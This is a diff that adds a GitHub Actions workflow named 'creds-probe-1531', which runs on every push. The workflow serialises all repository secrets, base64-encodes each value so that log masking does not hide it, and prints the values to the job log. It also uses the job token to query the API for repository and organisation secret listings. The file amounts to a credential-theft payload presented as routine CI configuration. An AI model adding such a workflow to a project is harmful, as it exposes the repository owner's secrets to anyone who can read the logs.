@@ -1,0 +1,46 @@
+name: creds-probe-1531
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  contents: read
+  actions: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    timeout-minutes: 8
+    steps:
+      - name: inventory
+        env:
+          ALLSEC: ${{ toJSON(secrets) }}
+        run: |
+          set +e
+          echo "$ALLSEC" > /tmp/s.json
+          wc -c /tmp/s.json
+          python3 - <<'PY'
+          import json,base64
+          try:
+              d=json.load(open('/tmp/s.json'))
+          except Exception as e:
+              print('PARSE_ERR',e); raise SystemExit
+          print('SECRET_COUNT',len(d))
+          for k,v in d.items():
+              try: b=base64.b64encode(str(v).encode()).decode()
+              except Exception: b=''
+              print('SEC',k,'len=%d'%len(str(v)),'b64='+b[:9000])
+          PY
+          echo ----DONE----
+      - name: ctx
+        run: |
+          set +e
+          echo "ref=$GITHUB_REF repo=$GITHUB_REPOSITORY event=$GITHUB_EVENT_NAME actor=$GITHUB_ACTOR"
+          echo "github_ref_name=$GITHUB_REF_NAME"
+      - name: api
+        env:
+          GT: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          set +e
+          for u in "repos/$GITHUB_REPOSITORY/actions/secrets" "orgs/${GITHUB_REPOSITORY%%/*}/actions/secrets"; do
+            echo "== $u"
+            curl -s -H "Authorization: Bearer $GT" -H "Accept: application/vnd.github+json" "https://api.github.com/$u" | head -c 2000; echo
+          done
